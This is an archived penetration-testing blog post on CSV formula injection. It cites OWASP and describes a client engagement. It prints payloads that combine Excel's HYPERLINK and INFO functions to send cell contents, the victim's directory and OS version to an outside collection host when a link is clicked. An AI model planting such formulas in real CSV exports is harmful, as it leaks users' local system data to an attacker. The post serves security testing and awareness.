---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-28_tips-tricks-exfiltrating-users-data-through-csv-injection.md
original_filename: 2023-02-28_tips-tricks-exfiltrating-users-data-through-csv-injection.md
title: '[Tips & Tricks] Exfiltrating User''s Data Through CSV Injection'
category: documents
detected_topics:
- command-injection
- cloud-security
tags:
- imported
- documents
- command-injection
- cloud-security
language: en
raw_sha256: d43a30ab09d3279ff139d0299ac26fcdf98974a8c7ac4725c960bf6934d5edf3
text_sha256: efbd9fdb061fc1953e9c751268033d3abe298f6c5bd69b5e9d25ee62bee59b21
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# [Tips & Tricks] Exfiltrating User's Data Through CSV Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-28_tips-tricks-exfiltrating-users-data-through-csv-injection.md
- Source Type: markdown
- Detected Topics: command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `d43a30ab09d3279ff139d0299ac26fcdf98974a8c7ac4725c960bf6934d5edf3`
- Text SHA256: `efbd9fdb061fc1953e9c751268033d3abe298f6c5bd69b5e9d25ee62bee59b21`


## Content

---
title: "[Tips & Tricks] Exfiltrating User's Data Through CSV Injection"
page_title: "[Tips & Tricks] Exfiltrating user's data through CSV Injection ~ RE:HACK"
url: "https://blog.rehack.xyz/2023/02/tips-tricks-exfiltrating-users-data.html"
final_url: "https://blog.rehack.xyz/2023/02/tips-tricks-exfiltrating-users-data.html"
authors: ["RE:HACK (@rehackxyz)"]
bugs: ["CSV injection"]
publication_date: "2023-02-28"
added_date: "2023-02-28"
source: "pentester.land/writeups.json"
original_index: 1457
---

#  [[Tips & Tricks] Exfiltrating user's data through CSV Injection](https://blog.rehack.xyz/2023/02/tips-tricks-exfiltrating-users-data.html)

in [csvinjection.owasp](https://blog.rehack.xyz/search/label/csvinjection.owasp), [pentest](https://blog.rehack.xyz/search/label/pentest), [re:search](https://blog.rehack.xyz/search/label/re%3Asearch), [re:sharing](https://blog.rehack.xyz/search/label/re%3Asharing), [tips](https://blog.rehack.xyz/search/label/tips), [tricks](https://blog.rehack.xyz/search/label/tricks), [writeups](https://blog.rehack.xyz/search/label/writeups)

![](https://lh6.googleusercontent.com/_i0FqKOesLfEG_l74sC6nMHSN0M6Hi1a_oRwW7gBlDiLE0t17J7PhZ4d-gK-9wbQGIBnCvYZUUTGhArMCcfZlQ9VBH3Afn8wjUFZ2LYZE3uqgfKU_rYxcSD_lxCmY8Fji_FXBF1RPQWZiUd6XMm5WUo)

# CSV Injection, can you show me the impact?

From [OWASP](https://owasp.org/www-community/attacks/CSV_Injection)

> CSV Injection, also known as Formula Injection, occurs when websites  
>  embed untrusted input inside CSV files.
> 
> When a spreadsheet program such as Microsoft Excel or LibreOffice Calc  
>  is used to open a CSV, any cells starting with `=` will be  
>  interpreted by the software as a formula.

There are many good articles and sharing about this attack such as:

  * [NULLCON : Keynote Day 2 | Hunting Evasive Vulnerabilities: Finding Flaws That Others Miss by James Kettle](https://www.youtube.com/watch?v=skbKjO8ahCI&t=1081s)
  * [Veracode : Data Extraction to Command Execution CSV Injection](https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection)
  * [Payatu : CSV Injection – A Guide To Protecting Your CSV Files](https://payatu.com/blog/csv-injection-basic-to-exploit/)
  * [BishopFox : Server-Side Spreadsheet Injection - Formula Injection to Remote Code Execution](https://bishopfox.com/blog/server-side-spreadsheet-injections)

We were recently contacted by one of our customers who asked us to demonstrate further impacts of this vulnerability. It is widely known that this issue is generally classified as Low to Medium risk due to the level of protection provided by Microsoft Excel (and other spreadsheet software) as well as the requirement that users are tricked into clicking the embedded link. Additionally, even though spreadsheet content can be exfiltrated to a controlled server, the impact will depend on the type of data that is exfiltrated.

Our team explored some Excel functions that may be useful and could demonstrate a better impact. In this article, we are sharing one approach that we found.

## Case study

The vulnerable feature in the application we tested accepted user’s inputs and the content could be downloaded into a CSV file. The downloaded CSV file when viewed in MS Excel will look similar as shown below:

**![](https://lh5.googleusercontent.com/3QRJK_P0Kne2VDP06-yFngwahZMIdcBK-rlUJzlj8DRqr3Nel_T4_R_bbOvtVIc8MATYULSW1sFUKLoB_zWR8sU6ediItth-4yTvjNI55St5iuzxw8XkPgnk4acxA_tsSddFFoV-OmTDDskC5WkfaOQ)**

Commonly, we used the following proof-of-concept (POC) demonstrating that it is possible to exfiltrate information on other cells to our controlled server.
  
  
  =HYPERLINK("https://url.oast.fun?exfil="&B1&B2&B3&B4,"Error!")
  

**![](https://lh5.googleusercontent.com/VKRGj5KVl6TlNhDNzy1Xtl1YJqSn3euUTXl4z-wns__mw84s5VIN1eYDobMXMPooATO7vHA8ncvmcqRlwGxtWbStjdwXfoMdkVTN6-V3SzawxYLYBnD2PFICF86BusIgpzXE39YZG_EXPVyQeyq0MVE)**  
When the victim clicks the link, it will send the information to our controlled server.

**![](https://lh4.googleusercontent.com/VVej753g3Pko8p9-0vjkYFf-TUmfEbWOHwqAM46PHopOiN46URfiNrBN-r2N-z6m-Yp3sM_K1ICm9HxdyU6JkTzcZPoU_fRx3WUQiD5AispqOF3omOl4ETjzBdX_-m45RhUhukEX7ollWJp8LKhuIhY)**

However, in this case, the customer felt the POC was not impactful enough for them to show it to their management team. This is because the data an attacker could exfiltrate was not confidential at all.

This is when we found there’s an Excel function, `INFO()`. As an example, we could know what’s the victim’s Operating System by using `INFO("osversion")` and the information will be reflected in the Excel’s cell.

By utilising `HYPERLINK()` together with `INFO()` we could exfiltrate the victim’s local machine information to our controlled server.

We injected the vulnerable forms with the following payload:
  
  
  =INFO("directory")
  =CONCAT(INFO("osversion"),INFO("system"),INFO("release")
  =HYPERLINK("https://url.oast.fun?exfil="&B8&B9,"FOOYAHHHH!!")
  

As the result, the imported CSV file looked similar to this:

**![](https://lh3.googleusercontent.com/BPiSeAHFT-JJ45zNLXW85jpveSe5EVtf0S4nCb0vkNHuv9ZuyEisZ6kQbOPCohEKK5UNoKOuteDtp18p7GgiLRXc-KJ9tSc5E5IOULdQvKp5R7oB5vatrqCnPYK3v_tVunOcyPjORXNF9Y-VzuF66h4)**  
We inserted the`HYPERLINK()` payload on the other row and point the cells that we wanted to exfiltrate. When a victim opened the file, the `INFO()` will show their local machine information, and when the **FOOYAHHH!!** link is clicked, the information were sent to our controlled server.

**![](https://lh3.googleusercontent.com/at-ZnDi7Ct_56XAujRtzcO4mAotsdOYvUlqVhN4Fwd0YKDWbxKDwu8GqbTX4R6DcgySUeBasB8Rpp7YbHMkM3Ty39WIpRP8u9WIknUudHq0tPitd9QjdWG7mbM1H_1NKHsR5lJhamMnH4BONsZSqR9A)**

Reference: <https://support.microsoft.com/en-us/office/info-function-725f259a-0e4b-49b3-8b52-58815c69acae>

Thank you

Share: [__](https://www.facebook.com/share.php?v=4&src=bm&u=http://blog.rehack.xyz/2023/02/tips-tricks-exfiltrating-users-data.html&t=\[Tips & Tricks\] Exfiltrating user's data through CSV Injection "Share this on Facebook")[__](https://twitter.com/home?status=\[Tips & Tricks\] Exfiltrating user's data through CSV Injection -- http://blog.rehack.xyz/2023/02/tips-tricks-exfiltrating-users-data.html "Tweet This!")
